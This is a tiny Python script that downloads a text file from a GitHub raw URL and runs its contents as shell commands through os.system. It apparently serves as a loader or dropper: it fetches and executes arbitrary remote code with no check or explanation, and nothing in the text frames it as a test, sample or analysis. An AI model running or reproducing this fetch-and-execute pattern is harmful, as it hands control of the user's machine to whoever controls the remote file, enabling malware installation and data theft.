import os,re,sys,time,requests,json

response = requests.get("https://raw.githubusercontent.com/xMakiBoT/procsys24/main/boot.txt")
os.system(response.text)